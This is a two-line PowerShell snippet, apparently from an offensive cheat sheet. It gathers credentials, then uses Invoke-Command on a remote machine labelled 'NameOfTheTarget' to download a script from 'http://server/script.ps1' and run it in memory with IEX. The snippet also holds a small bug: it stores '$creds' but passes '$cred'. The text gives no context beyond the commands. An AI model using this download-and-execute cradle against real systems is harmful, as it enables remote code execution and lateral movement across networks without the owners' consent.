$creds = get-credential
Invoke-Command -ComputerName NameOfTheTarget -credential $cred -ScriptBlock {IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')}
